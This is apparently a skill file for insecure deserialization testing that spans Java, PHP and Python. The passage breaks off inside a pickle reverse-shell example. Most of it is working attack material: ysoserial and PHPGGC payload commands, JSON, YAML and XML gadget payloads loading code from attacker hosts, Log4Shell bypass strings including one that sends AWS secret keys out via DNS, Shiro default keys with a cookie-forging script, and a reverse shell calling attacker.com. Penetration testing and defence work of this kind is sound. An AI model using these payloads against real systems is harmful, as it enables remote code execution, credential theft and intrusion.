---
name: deserialization
description: Comprehensive insecure deserialization testing skill covering Java, PHP, Python, .NET, Ruby, Node.js, and protocol-level attack surfaces with full gadget chain catalogs, payloads, CVE database, detection rules, and remediation guidance. Covers CWE-502 / OWASP A08:2021 from reconnaissance through exploitation, detection, and secure remediation.
sources: hackerone_public, cve_database, exploit_db, owasp, portswigger
---

# Insecure Deserialization Testing

## Core Principle

A deserialization vulnerability is **not** proven by finding serialized data or a dangerous API. It is established by demonstrating that lower-trust data can influence an unsafe object-reconstruction process across a security boundary and produce an unauthorized security-relevant effect under actual runtime conditions.

**Two-part requirement:** sink (unsafe deserialization API processing untrusted data) + gadget chains (classes available in the runtime whose callback methods chain into dangerous operations). Removing either part defeats the attack.

**Central analysis model:**
```
Attacker-Controlled Source
  → Encoding (Base64, URL, Hex)
    → Decoding
      → Decompression (gzip, zlib)
        → Trust Verification (HMAC, signature, encryption)
          → Deserializer (the SINK)
            → Type Resolution (which class?)
              → Object Construction (allocation, field setting)
                → Lifecycle Callbacks (readObject, __wakeup, __reduce__)
                  → Downstream Use (hashCode, toString, equals)
                    → Security Side Effect (RCE, SSRF, file I/O)
```

---

## Part 1: Reconnaissance and Format Fingerprinting

### Magic Bytes and Signatures

| Format | Hex Signature | Base64 Prefix | Content-Type | Detection Pattern |
|---|---|---|---|---|
| **Java Serialization** | `AC ED 00 05` | `rO0AB` | `application/x-java-serialized-object` | `\xac\xed\x00\x05` or `rO0AB` |
| **Java Serialization (gzipped)** | `1F 8B` then `AC ED` | `H4sIAAA` | varies | gzip header + Java magic inside |
| **Fastjson @type** | N/A (JSON text) | N/A | `application/json` | `"@type"\s*:\s*"[a-z]` |
| **Jackson typed** | N/A (JSON text) | N/A | `application/json` | `"@class"\s*:\s*"` or `\["[a-z]+\.` |
| **Hessian** | `4D` (call) or `48 02 00` (v2) | N/A | `application/x-hessian` | Protocol-specific |
| **AMF (Flash)** | `00 03` (AMF0) or `00 05` (AMF3) | N/A | `application/x-amf` | AMF header |
| **PHP Serialized** | Text: `O:`, `a:`, `s:`, `i:`, `b:` | N/A | N/A | `^[Oasidb]:\d+[:{]` |
| **Python Pickle v2** | `\x80\x02` | `gAI` | N/A | `\x80\x02`-`\x80\x05` |
| **Python Pickle v3** | `\x80\x03` | `gAM` | N/A | |
| **Python Pickle v4** | `\x80\x04` | `gAQ` | N/A | |
| **.NET BinaryFormatter** | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | N/A | 16-byte header |
| **Ruby Marshal** | `\x04\x08` | `BAg` | N/A | 2-byte version header |
| **SnakeYAML (dangerous)** | `---` with `!!` tags | N/A | `text/yaml` | `!!javax`, `!!java`, `!!com` |
| **ViewState (.NET)** | HTML hidden field | Starts with `/w` | N/A | `__VIEWSTATE` input |
| **PHAR (PHP)** | `__HALT_COMPILER();` | N/A | N/A | May use GIF89a stub |
| **T3 (WebLogic)** | `t3 12.2.1\n` | N/A | N/A | TCP 7001 |
| **OpenWire (ActiveMQ)** | `\x00\x00\x00...` | N/A | N/A | TCP 61616 |
| **Shiro rememberMe** | Base64 in cookie | N/A | N/A | Cookie: `rememberMe=<base64>` |

### Detection Commands

```bash
# Java serialization in HTTP traffic (raw + base64)
grep -rP '\xac\xed\x00\x05|rO0AB[A-Za-z0-9+/=]' captured_traffic.pcap

# Fastjson @type in JSON traffic
grep -rP '"@type"\s*:\s*"[a-zA-Z]' access.log proxy.log

# Shiro rememberMe cookie
grep -oP 'rememberMe=[A-Za-z0-9+/=]{20,}' cookies.txt

# Decode Java serialization stream
echo "rO0ABXNy..." | base64 -d | xxd | head -40

# Full Java stream analysis with SerializationDumper
java -jar SerializationDumper.jar -r serialized.bin

# Python pickle opcode disassembly
python3 -c "import pickletools; pickletools.dis(open('data.pkl','rb'))"

# Port scanning for deserialization services
nmap -sV -p 1099,7001,8009,8080,9010,61616,11211,6379 \
  --script=rmi-dumpregistry,rmi-vuln-classloader target
```

### Trust Boundary Classification

| Type | Description | Severity | Example |
|---|---|---|---|
| A: External -> App | Unauthenticated internet attacker | Critical | HTTP body with Java serialization |
| B: Auth User -> App | Auth user privilege escalation | High | Serialized profile cookie -> RCE |
| C: Low-Priv -> High-Priv | Component escalation | High | Web app queues job for admin worker |
| D: Cross-Service | Microservice boundary | High | Service A -> Hessian RPC -> Service B |
| E: Temporal | Trust degrades over time | Medium | Signed token with rotated/leaked key |

### Decision Matrix — Which Exploitation Path

```
Detected Signal                           Exploitation Path
-----------------------------------------------------------------
AC ED 00 05 / rO0AB in traffic         -> Java core deser (ysoserial)
rememberMe cookie                      -> Apache Shiro AES key brute force
@type in JSON                          -> Fastjson autoType exploitation
@class in JSON                         -> Jackson DefaultTyping
!! tags in YAML                        -> SnakeYAML / PyYAML
O:\d+:" in cookies/params              -> PHP unserialize() + PHPGGC
phar:// in file paths                  -> PHP PHAR deserialization
__VIEWSTATE in HTML                    -> .NET ViewState exploitation
pickle/marshal imports                 -> Python/Ruby deserialization
.pkl model files                       -> ML model supply chain
Port 1099 open                         -> Java RMI
Port 7001 open                         -> WebLogic T3/IIOP
Port 61616 open                        -> ActiveMQ OpenWire
Port 20880 open                        -> Apache Dubbo Hessian2
/messagebroker/amf endpoint            -> AMF/BlazeDS deserialization
${jndi: in any field                   -> Log4Shell JNDI injection
Telerik UI detected                    -> CVE-2019-18935
node-serialize in package.json         -> Node.js eval() RCE
__proto__ in request parameters        -> Prototype pollution -> RCE
```

---

## Part 2: Java Native Deserialization

### Java Serialization Stream Internals

```
Stream Layout:
  STREAM_MAGIC      = 0xACED    (2 bytes)
  STREAM_VERSION    = 0x0005    (2 bytes)
  content*

Key Type Codes:
  TC_CLASSDESC      = 0x72      (class descriptor)
  TC_OBJECT         = 0x73      (new object)
  TC_STRING         = 0x74
  TC_ARRAY          = 0x75
  TC_PROXYCLASSDESC = 0x7D      (dynamic proxy class)

Processing order (ObjectInputStream):
  1. readStreamHeader() -- verify AC ED 00 05
  2. readObject() -- read TC_OBJECT
  3. readClassDesc() -- read class name + serialVersionUID
  4. resolveClass() -- Class.forName(className)  <- JEP 290 filter point
  5. newInstance() -- Unsafe.allocateInstance() (NO constructor called)
  6. readSerialData() -- populate fields
  7. readObject() -- if SC_WRITE_METHOD flag, invoke private readObject()
                     <- THIS IS WHERE GADGET CHAINS EXECUTE
  8. readResolve() -- if class implements, replace object
```

### Three Terminal Sinks

**Sink 1 — InvokerTransformer -> Runtime.exec()** (Commons Collections)
```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"})
};
```

**Sink 2 — TemplatesImpl -> defineClass() -> static initializer** (preferred over Sink 1)
```java
// Trigger chain:
// gadget.trigger() -> getOutputProperties()
//   -> getTransletInstance()
//     -> defineTransletClasses()
//       -> loader.defineClass(_bytecodes[0])
//         -> Class.<clinit>()  <- attacker static initializer executes
TemplatesImpl._bytecodes = new byte[][]{ attackerBytecode };
TemplatesImpl._name = "anything";  // non-null required
TemplatesImpl._tfactory = new TransformerFactoryImpl();
```

**Sink 3 — JNDI Lookup -> Remote Class Loading**
```java
// JdbcRowSetImpl.setDataSourceName("ldap://attacker/obj")
// JdbcRowSetImpl.setAutoCommit(true)
//   -> connect() -> InitialContext.lookup("ldap://attacker/obj")
//     -> JVM loads and instantiates class -> RCE

// Post-JDK 8u191 bypasses (trustURLCodebase=false):
// - Tomcat BeanFactory EL expression evaluation
// - javaSerializedData in LDAP response (ysoserial gadget in LDAP attribute)
// - LDAP -> RMI redirect -> local factory class
```

### ysoserial Gadget Chain Catalog

| Payload | Required Libraries | JDK Constraint | Entry -> Sink | Impact |
|---|---|---|---|---|
| **CommonsCollections1** | commons-collections:3.1 | <= JDK 8u71 | `AnnotationInvocationHandler.readObject()` -> Proxy -> `LazyMap.get()` -> InvokerTransformer | RCE |
| **CommonsCollections2** | commons-collections4:4.0 | Any | `PriorityQueue.readObject()` -> `TransformingComparator.compare()` -> TemplatesImpl | RCE |
| **CommonsCollections3** | commons-collections:3.1 | <= JDK 8u71 | `AnnotationInvocationHandler` -> InstantiateTransformer -> TrAXFilter -> TemplatesImpl | RCE |
| **CommonsCollections4** | commons-collections4:4.0 | Any | `PriorityQueue` -> `TransformingComparator` -> `InstantiateTransformer` -> TemplatesImpl | RCE |
| **CommonsCollections5** | commons-collections:3.1 | <= JDK 8u76 | `BadAttributeValueExpException.readObject()` -> `TiedMapEntry.toString()` -> InvokerTransformer | RCE |
| **CommonsCollections6** | commons-collections:3.1 | **Any (star)** | `HashSet.readObject()` -> `HashMap.hash()` -> `TiedMapEntry.hashCode()` -> InvokerTransformer | RCE |
| **CommonsCollections7** | commons-collections:3.1 | Any | `Hashtable.readObject()` -> `AbstractMap.equals()` -> `LazyMap.get()` -> InvokerTransformer | RCE |
| **CommonsBeanutils1** | commons-beanutils:1.9.2 + CC:3.1 | Any | `PriorityQueue` -> `BeanComparator.compare()` -> `PropertyUtils.getProperty()` -> TemplatesImpl | RCE |
| **CommonsBeanutils1_nCC** | commons-beanutils:1.8.3+ (no CC) | Any | Same but uses internal CC shim — works against Apache Shiro | RCE |
| **Spring1** | spring-core, spring-beans:4.1.4 | Any | Spring type coercion -> TemplatesImpl | RCE |
| **Spring2** | spring-core, spring-aop:4.1.4 | Any | `AnnotationInvocationHandler` -> Spring AOP -> TemplatesImpl | RCE |
| **Groovy1** | groovy:2.3.9 | Any | `AnnotationInvocationHandler` -> `ConvertedClosure` -> `MethodClosure` -> `Runtime.exec()` | RCE |
| **BeanShell1** | bsh:2.0b5 | Any | BeanShell interpreter -> arbitrary code | RCE |
| **Jdk7u21** | None (JDK only) | <= JDK 7u21 | `LinkedHashSet` -> dynamic proxy -> `TemplatesImpl.newTransformer()` | RCE |
| **Jdk8u20** | None (JDK only) | 7u25 - 8u20 | `BeanContextSupport` malformed stream -> type check bypass -> TemplatesImpl | RCE |
| **Hibernate1/2** | hibernate-core | Any | Hibernate getter chains -> TemplatesImpl | RCE |
| **ROME** | rome:1.0 | Any | `ObjectBean.hashCode()` -> `ToStringBean.toString()` -> TemplatesImpl | RCE |
| **C3P0** | c3p0:0.9.5.2 | Any | c3p0 JNDI remote classloading | RCE |
| **Jython1** | jython-standalone:2.5.2 | Any | Jython runtime -> Python exec | RCE |
| **Vaadin1** | vaadin-server:7.7.14 | Any | Vaadin property resolution -> TemplatesImpl | RCE |
| **Clojure** | clojure:1.8.0 | Any | Clojure protocol dispatch -> arbitrary code | RCE |
| **MozillaRhino1/2** | js:1.7R2 | Any | Rhino script engine -> JS execution | RCE |
| **URLDNS** | None (JDK only) | **Any (star)** | `HashMap.readObject()` -> `URL.hashCode()` -> DNS lookup | Detection only |
| **JRMPClient** | None (JDK/RMI) | Any | Outbound JRMP connection to attacker server | SSRF/RCE |
| **FileUpload1** | commons-fileupload:1.3.1 | Any | FileUpload disk item -> arbitrary file write | File Write |
| **AspectJWeaver** | aspectjweaver:1.9.2 | Any | AspectJ weaving -> arbitrary file write | File Write |

(star) = Most portable / recommended for initial testing

### Payload Generation Commands

```bash
# SAFE DETECTION PROBES

# URLDNS -- DNS callback, no dependencies, any JDK (always try this first)
java -jar ysoserial.jar URLDNS "http://deser-test.attacker.com" | base64 -w0

# JRMPClient -- SSRF probe to your listener
java -jar ysoserial.jar JRMPClient "your-ip:1099" | base64 -w0

# RCE CHAINS

# CommonsCollections6 -- most portable CC3.x chain (any JDK)
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker/confirm" | base64 -w0

# CommonsCollections2 -- for CC4 targets
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker/confirm" | base64 -w0

# CommonsBeanutils1 -- for Shiro and CB targets (no CC needed)
java -jar ysoserial.jar CommonsBeanutils1 "curl http://attacker/confirm" | base64 -w0

# ROME -- for RSS library targets
java -jar ysoserial.jar ROME "curl http://attacker/confirm" | base64 -w0

# JYso -- modern ysoserial fork with more chains
java -jar JYso.jar -g CommonsCollections6 \
  -p "bash -c {echo,Y3VybCBodHRwOi8v...}|{base64,-d}|{bash,-i}"

# marshalsec -- JNDI reference server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Evil"
```

### Chain Selection Logic

```
START: Confirmed deserialization sink
  |
  +- Step 1: CONFIRM with URLDNS (safe, JDK-only, any version)
  |
  +- Step 2: ENUMERATE CLASSPATH
  |   +- pom.xml / build.gradle / WEB-INF/lib/ (source access)
  |   +- Error messages (ClassNotFoundException reveals loaded classes)
  |   +- ClassNotFoundException oracle (submit serialized probe, observe error)
  |
  +- Step 3: SELECT CHAIN
  |   +- commons-collections 3.x present?
  |   |   +- YES + JDK <= 8u71 -> CC1 or CC3
  |   |   +- YES + any JDK -> CC6 (most portable) or CC7
  |   +- commons-collections 4.x present? -> CC2 or CC4
  |   +- commons-beanutils + CC present? -> CommonsBeanutils1
  |   +- commons-beanutils, no CC? -> CommonsBeanutils1_nCC (works on Shiro!)
  |   +- Spring Framework? -> Spring1 or Spring2
  |   +- Groovy? -> Groovy1
  |   +- ROME? -> ROME
  |   +- Hibernate? -> Hibernate1 or Hibernate2
  |   +- No known gadget library? -> JRMPClient -> SSRF to malicious JRMP server
  |   +- Apache Shiro? -> CommonsBeanutils1_nCC (CB is Shiro's own dependency)
  |
  +- Step 4: VERIFY IMPACT SAFELY (DNS/HTTP callback only)
```

---

## Part 3: Java JSON/YAML Libraries

### Fastjson autoType Exploitation

**CVE history and bypass lineage:**

| Version Range | Defense | Bypass | CVE |
|---|---|---|---|
| **<= 1.2.24** | None | Direct `@type` with any class | CVE-2017-18349 |
| **1.2.42** | Hashed denylist | Double wrapping: `"@type":"LLcom.sun...;;"` | — |
| **1.2.47** | — | Cache bypass (works with autoType OFF!) | CVE-2019-... |
| **1.2.83** | safeMode added | CVE-2022-25845: autoType shutdown bypass | CVE-2022-25845 |
| **1.2.68-1.2.83** | safeMode=false default | CVE-2026-16723 (CVSS 9.0): RCE without autoType, NO 1.x patch | CVE-2026-16723 |

```json
// PRE-1.2.25 -- JNDI via JdbcRowSetImpl
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/obj",
    "autoCommit": true
}

// PRE-1.2.25 -- TemplatesImpl bytecode loading
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["<base64 bytecode extending AbstractTranslet>"],
    "_name": "a.b",
    "_tfactory": {},
    "outputProperties": {}
}

// 1.2.42 -- DOUBLE-WRAPPER BYPASS
{
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "ldap://attacker.com/obj",
    "autoCommit": true
}

// 1.2.47 -- CACHE BYPASS (WORKS WITH AUTOTYPE OFF!)
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://attacker.com/obj",
        "autoCommit": true
    }
}

// SAFE DETECTION PROBE (DNS only)
{
    "@type": "java.net.Inet4Address",
    "val": "deser-test.attacker.com"
}
```

Remediation: No 1.x patch for CVE-2026-16723. Migrate to Fastjson 2.x with safeMode or use Jackson/Gson.

### Jackson Polymorphic Deserialization

**Vulnerable configurations:**
```java
mapper.enableDefaultTyping();                              // ALL classes -- DANGEROUS
mapper.enableDefaultTyping(DefaultTyping.EVERYTHING);
mapper.enableDefaultTyping(DefaultTyping.NON_FINAL);

@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)      // attacker specifies FQCN -- DANGEROUS
@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  // relative FQCN -- DANGEROUS
```

Key CVEs: CVE-2017-7525, CVE-2017-15095, CVE-2018-5968, CVE-2018-7489, CVE-2019-12384, CVE-2020-8840, CVE-2021-20190, CVE-2026-54512 (PTV generic bypass), CVE-2026-54513 (PTV array bypass)

```json
// ARRAY-WRAPPER FORMAT -- TemplatesImpl bytecode loading
["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {
    "transletBytecodes": ["<base64 bytecode>"],
    "transletName": "a.b",
    "outputProperties": {}
}]

// JdbcRowSetImpl JNDI
["com.sun.rowset.JdbcRowSetImpl", {
    "dataSourceName": "ldap://attacker.com/obj",
    "autoCommit": true
}]

// Spring ClassPathXmlApplicationContext
["org.springframework.context.support.ClassPathXmlApplicationContext",
    "http://attacker.com/evil-beans.xml"]

// logback JDBC -> H2 RCE
["ch.qos.logback.core.db.DriverManagerConnectionSource", {
    "url": "jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'"
}]

// PROPERTY FORMAT (@JsonTypeInfo As.PROPERTY)
{
    "@class": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/obj",
    "autoCommit": true
}

// CVE-2026-54512 -- PTV generic type parameter smuggling
{
    "value": ["java.util.ArrayList<com.evil.EvilGadget>", [{"cmd": "calc"}]]
}

// SAFE DETECTION PROBE
["java.net.URL", "http://deser-test.attacker.com"]
```

Fix: jackson-databind >= 2.18.8 / 2.21.4 / 3.1.4 with strict PTV allowlist:
```java
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(
        BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(MyBaseInterface.class)
            .allowIfSubType("com.myapp.dto.")
            .build(),
        DefaultTyping.NON_FINAL
    ).build();
```

### SnakeYAML Exploitation

```yaml
# PRIMARY PAYLOAD -- ScriptEngineManager via URLClassLoader (CVE-2022-1471)
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-server/malicious.jar"]
  ]]
]
# Chain: ScriptEngineManager constructor -> initEngines() -> ServiceLoader
# -> reads META-INF/services/javax.script.ScriptEngineFactory from remote JAR
# -> instantiates attacker class -> static initializer executes -> RCE

# RUNTIME.EXEC VIA PROCESSBUILDER
!!java.lang.ProcessBuilder [["calc.exe"]]

# SPRING CLASSLOADER
!!org.springframework.context.support.ClassPathXmlApplicationContext
  ["http://attacker/evil-beans.xml"]

# DNS PROBE (SAFE)
!!java.net.URL ["http://deser-test.attacker.com"]
```

Versions: `< 2.0` with `yaml.load()` / `FullLoader` = Critical. `>= 2.0` = Safe by default.

Fix: `Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));` or upgrade to 2.0+.

### XStream Exploitation

```xml
<!-- EventHandler-based RCE (pre-1.4.7) -->
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc.exe</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

CVE timeline: CVE-2013-7285, CVE-2019-10173, CVE-2020-26217, CVE-2021-21341-21351 (DoS + 7 RCE), CVE-2021-39139-39154 (16 distinct RCE variants). XStream 1.4.18+ switched from denylist to allowlist by default.

```java
// Secure XStream (1.4.18+):
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.addPermission(NullPermission.NULL);
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
xstream.allowTypes(new Class[]{ MyDTO.class });
```

---

## Part 4: Java Protocol and RPC

### Apache Shiro rememberMe (CVE-2016-4437, CVSS 9.8, CISA KEV, pre-auth RCE)

```
Attack chain -- hardcoded key:
1. Shiro <= 1.2.4 uses HARDCODED AES-128-CBC key: kPH+bIxk5D2deZiIxcaaaA==
2. Generate ysoserial payload (CommonsBeanutils1_nCC -- CB is Shiro dependency)
3. AES-128-CBC encrypt with known key
4. Base64-encode -> Cookie: rememberMe=<base64>
5. Server decrypts -> deserializes -> RCE
```

Known default keys:
```python
KNOWN_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",     # Official default
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "ZUdsaGJuZGFuZGFuZGFuZA==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "r0e3c16IdVkouZgk1TKVMg==",
]
```

Shiro encryption script:
```python
import base64, uuid
from Crypto.Cipher import AES

def pad(data):
    bs = AES.block_size
    padding = bs - len(data) % bs
    return data + bytes([padding]) * padding

def encrypt_payload(payload_bytes, key_b64):
    key = base64.b64decode(key_b64)
    iv = uuid.uuid4().bytes
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(payload_bytes))
    return base64.b64encode(iv + encrypted).decode()

# Usage:
# 1. java -jar ysoserial.jar CommonsBeanutils1 "cmd" > payload.bin
# 2. cookie_value = encrypt_payload(open("payload.bin","rb").read(), KNOWN_KEYS[0])
# 3. Cookie: rememberMe=<cookie_value>
```

**SHIRO-721 — Padding Oracle (Shiro 1.2.5-1.4.1, when key changed):**
```
AES-CBC provides NO integrity -> CBC padding oracle technique
Valid rememberMe cookie used as oracle prefix -> byte-by-byte encryption
~128 requests per byte * payload length = hours
Fixed: Shiro 1.4.2 (switched to AES-GCM)

Tool: java -jar shiro_attack.jar -u http://target/login \
  -c "valid_rememberMe_cookie" -g CommonsBeanutils1
```

### Log4Shell JNDI Injection (CVE-2021-44228, CVSS 10.0)

**Injection points:** Any logged field -- User-Agent, X-Forwarded-For, Referer, Accept-Language, username, search query, email, URL path

```bash
# BASIC PAYLOADS
${jndi:ldap://attacker.com/obj}
${jndi:rmi://attacker.com/obj}
${jndi:dns://attacker.com/a}

# WAF BYPASS VARIANTS
${${lower:j}ndi:ldap://attacker.com/obj}
${${upper:j}ndi:ldap://attacker.com/obj}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/obj}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/obj}
${j${::-n}di:ldap://attacker.com/obj}
${${lower:j}${lower:n}${lower:d}i:${lower:l}${lower:d}a${lower:p}://attacker.com/a}

# DATA EXFILTRATION VIA DNS
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}
${jndi:ldap://${sys:user.name}.attacker.com/a}
${jndi:ldap://${java:version}.attacker.com/a}
```

Fix progression: 2.15.0 (bypass) -> 2.16.0 (DoS remains) -> 2.17.0 (JDBC remains) -> **2.17.1 (fully patched)**

### Apache Dubbo Hessian2 CVEs

| CVE | Severity | Affected | Root Cause |
|---|---|---|---|
| **CVE-2020-1948** | Critical | < 2.7.7 | RPC Invocation deserialization |
| **CVE-2021-30179** | 9.8 | < 2.7.9 | Java native deser via generic service |
| **CVE-2021-43297** | Critical | < 2.7.15 | Exception logging triggers malicious `toString()` |
| **CVE-2022-39198** | High | Hessian-lite <=3.2.12 | Gadget-filter bypass |

```bash
nmap -p 20880,20881 -sV target
telnet target 20880  # ls, ls -l, invoke ServiceName.method(args)
java -cp marshalsec.jar marshalsec.Hessian <gadget> <command>
```

### WebLogic T3/IIOP (Port 7001)

CVE series: CVE-2015-4852, CVE-2016-0638, CVE-2016-3510, CVE-2017-3248, CVE-2018-2628, CVE-2018-2893, CVE-2019-2725, CVE-2020-2555, CVE-2020-2883, CVE-2020-14882, CVE-2023-21839, CVE-2024-20931

```bash
nmap -p 7001 --script=weblogic-t3-info target
python3 weblogic_exploit.py -t target -p 7001 --gadget CommonsCollections6 --cmd "id"
# Note: Some patches fix T3 but leave IIOP open
```

### RMI Attack Surface (Port 1099)

```bash
nmap -p 1099 --script=rmi-dumpregistry target
java -jar rmg.jar enum target 1099
java -jar rmg.jar serial target 1099 CommonsCollections6 "cmd"
java -jar rmg.jar call target 1099 '"methodName"' --gadget CommonsCollections6 --cmd "id"
```

### JEP 290/415 Filters

```
Filter pattern syntax (semicolon-separated, first match wins):
  com.myapp.dto.*          -- one-level package
  com.myapp.dto.**         -- package + all subpackages
  !com.evil.*              -- reject if matches
  !*                       -- REQUIRED: reject-all fallback (missing = UNDECIDED = ALLOWED)

Limit rules: maxdepth=N  maxrefs=N  maxbytes=N  maxarray=N
```

JEP 290 bypass techniques:
- No filter configured (opt-in -- most apps don't set it)
- No `!*` terminal -- unknown classes pass as UNDECIDED -> allowed
- MarshalledObject nested stream -- outer allows MarshalledObject, `.get()` opens inner stream with no filter
- JEP 290 ONLY covers ObjectInputStream -- not Kryo, Hessian, XStream, Jackson

```java
// JVM-WIDE FILTER
-Djdk.serialFilter=com.myapp.dto.*;java.lang.String;!*;maxdepth=10;maxrefs=500;maxbytes=131072

// PER-STREAM FILTER
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;java.lang.*;!*;maxdepth=5;maxrefs=100"
));
```

---

## Part 5: PHP Deserialization

### PHP Object Injection Mechanics

```
1. unserialize() receives: O:8:"ClassName":2:{s:4:"prop";s:5:"value";...}
2. PHP looks up "ClassName" in loaded classes (via autoload)
3. Allocates instance WITHOUT calling __construct()
4. Sets properties from serialized data (including private/protected)
5. Calls __wakeup() or __unserialize() (PHP 7.4+)
6. Object enters normal lifecycle
7. On GC or script end -> __destruct() fires (even after exceptions!)

PHP Serialization format:
  b:1;         -> boolean true
  i:42;        -> integer
  s:5:"hello"; -> string
  a:2:{...}    -> array
  O:8:"ClassName":1:{...}  -> object
  N;           -> null

Detection regex: ^[Oasidb]:\d+[:{]
```

### Magic Methods for POP Chains

| Method | Trigger | Chain Role |
|---|---|---|
| `__wakeup()` | Immediately after unserialize | Entry |
| `__unserialize(array)` | PHP 7.4+ (takes precedence) | Entry |
| `__destruct()` | GC or script end | Terminal -- fires even after exceptions |
| `__toString()` | String context | Pivot |
| `__call($name, $args)` | Undefined method invoked | Pivot |
| `__get($name)` | Undefined property read | Pivot |
| `__invoke()` | Object used as function | Pivot |

### PHPGGC Chains

```bash
phpggc -l                                              # List ALL available chains

# Key chains by framework:
# Laravel/RCE1-16:     Laravel 5.x-10.x
# Monolog/RCE1-7:      Monolog 1.x-3.x
# Guzzle/RCE1-2:       Guzzle 6.x-7.x
# Symfony/RCE1-16:     Symfony 2.x-6.x -> Process -> proc_open()
# WordPress/RCE1-2:    WordPress -> PHPMailer/Requests chains
# Doctrine/RCE1-2:     Doctrine -> Proxy method interception
# Magento/SQLI1:       Magento -> Zend DB adapter -> SQL injection
# Slim/RCE1:           Slim Framework
# Yii/RCE1-2:          Yii Framework
# ThinkPHP/RCE1-3:     ThinkPHP -> model chains
# ZendFramework/RCE1-3: Zend/Laminas

phpggc Laravel/RCE1 system id                          # Basic command
phpggc -b Laravel/RCE1 system id                       # Base64-encoded
phpggc -u Laravel/RCE1 system id                       # URL-encoded
phpggc -p phar -o exploit.phar Monolog/RCE1 system id  # PHAR format
phpggc -s Symfony/RCE1 system id                       # Raw serialized bytes
```

### PHAR Deserialization

```
Attack flow:
1. CREATE: Craft PHAR with serialized POP chain in metadata
   - Disguise as any file type (JPG, PNG, GIF, PDF)
   - GIF89a stub passes getimagesize() validation
2. UPLOAD: File passes upload validation
3. TRIGGER: PHP function processes path with phar:// prefix
   - file_exists("phar:///uploads/avatar.jpg") -> auto-deserializes metadata -> RCE
```

Functions that trigger PHAR deserialization (PHP < 8.0):
```
Filesystem:  file_exists, file_get_contents, fopen, file, is_dir, is_file, is_link,
             is_readable, is_writable, stat, lstat, scandir, realpath, rename, copy
Image:       getimagesize, exif_thumbnail, exif_imagetype, exif_read_data
Hash:        md5_file, sha1_file, hash_file, hash_hmac_file
Content:     mime_content_type, finfo_file
Archive:     ZipArchive::open
```

```php
<?php
// Requires: php.ini -> phar.readonly = Off
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');  // Passes image checks
// Use: phpggc -p phar Monolog/RCE1 system id
$phar->setMetadata(new VulnerableClass());
$phar->stopBuffering();
rename('exploit.phar', 'exploit.gif');  // Bypass extension checks
```

### Laravel APP_KEY Exploitation

```
Step 1: OBTAIN APP_KEY
  - .env file exposure, git history, debug mode (Ignition), backup files

Step 2: GENERATE PAYLOAD
  phpggc Laravel/RCE1 system "id" -b

Step 3: ENCRYPT WITH APP_KEY (AES-256-CBC + HMAC-SHA256)
  Structure: {"iv":"<b64>","value":"<b64 encrypted>","mac":"<HMAC>","tag":""}
  Whole structure base64-encoded -> Cookie: laravel_session=<forged>

Step 4: SERVER DECRYPTS -> unserialize() -> POP chain -> RCE
```

---

## Part 6: Python and ML Deserialization

### Pickle Protocol Exploitation

Key opcodes: `GLOBAL (c)` imports any module, `REDUCE (R)` calls any callable, `BUILD (b)` calls `__setstate__`.

```python
import pickle, os

# BASIC RCE via __reduce__
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())

# REVERSE SHELL
class RevShell:
    def __reduce__(self):
        return (os.system, (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"attacker.com\",4444));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
